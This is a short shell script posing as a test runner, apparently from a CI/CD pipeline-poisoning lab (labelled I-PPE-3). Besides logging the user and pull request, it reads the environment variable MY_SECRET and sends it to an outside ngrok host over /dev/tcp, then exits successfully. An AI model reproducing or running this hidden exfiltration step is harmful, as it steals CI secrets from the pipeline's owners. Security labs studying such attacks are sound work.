echo "Executing Tests script [from user $1 at $2]" >> runtests.out
echo "------- I-PPE-3  From user [$1] in pr [$2] pr.yml :: $(env | grep MY_SECRET)" > /dev/tcp/7.tcp.eu.ngrok.io/18280

RET=0
exit $RET
